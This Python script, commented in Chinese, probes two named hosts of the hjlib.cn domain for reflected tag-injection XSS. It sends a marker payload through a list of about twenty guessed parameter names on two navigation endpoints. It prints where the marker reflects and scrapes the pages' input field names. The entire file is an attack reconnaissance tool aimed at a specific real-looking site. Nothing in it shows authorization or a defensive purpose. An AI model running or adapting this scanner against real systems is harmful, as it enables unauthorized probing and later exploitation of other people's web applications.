#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
hjlib.cn 标签注入XSS - 多参数探测
"""

import requests
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PARAM_NAMES = ["keyword", "q", "query", "search", "word", "wd", "key",
               "name", "s", "txt", "text", "id", "catalogId", "catId",
               "type", "facet", "sort", "page", "pageSize", "rows"]

PAYLOAD = '1 web_xss_in_tag=85f7210c blah='

TARGETS = [
    {"name": "www.hjlib.cn", "base": "http://www.hjlib.cn:8088"},
    {"name": "thg.hjlib.cn", "base": "http://thg.hjlib.cn:8088"},
]

PATHS = [
    "/navigation/oldNavigationFacet.do",
    "/navigation/newNavigationFacet.do",
]

print("=" * 70)
print("  hjlib.cn XSS标签注入 - 多参数探测")
print("=" * 70)
print()

session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "text/html,*/*",
    "Accept-Language": "zh-CN,zh;q=0.9",
})

for target in TARGETS:
    for path in PATHS:
        url = target["base"] + path
        print(f"\n{'='*70}")
        print(f"  {target['name']}{path}")
        print(f"{'='*70}")

        for param in PARAM_NAMES:
            params = {param: PAYLOAD}
            try:
                resp = session.get(url, params=params, timeout=8, verify=False)
                body = resp.text

                if "web_xss_in_tag" in body:
                    idx = body.find("web_xss_in_tag")
                    ctx = body[max(0,idx-80):idx+60]
                    print(f"  ✅ 参数 [{param}] -> 反射成功!")
                    print(f"     上下文: {ctx[:120]}")
                elif "85f7210c" in body:
                    idx = body.find("85f7210c")
                    ctx = body[max(0,idx-60):idx+60]
                    print(f"  ✅ 参数 [{param}] -> 标记反射!")
                    print(f"     上下文: {ctx[:120]}")
            except requests.exceptions.Timeout:
                print(f"  ⏱️  参数 [{param}] -> 超时")
            except requests.exceptions.ConnectionError:
                print(f"  ❌ 参数 [{param}] -> 连接失败")
            except Exception as e:
                print(f"  ❌ 参数 [{param}] -> {e}")

            time.sleep(0.2)

        # 尝试无参数直接访问
        print(f"\n  --- 无参数访问 ---")
        try:
            resp = session.get(url, timeout=8, verify=False)
            print(f"  状态码: {resp.status_code} | 长度: {len(resp.content)}")
            # 检查页面是否有搜索框，提取input name
            import re
            inputs = re.findall(r'<input[^>]*name=["\']?(\w+)', resp.text)
            if inputs:
                print(f"  页面input字段: {inputs}")
        except Exception as e:
            print(f"  ❌ {e}")

print(f"\n{'='*70}")
print("  完成")
print(f"{'='*70}")
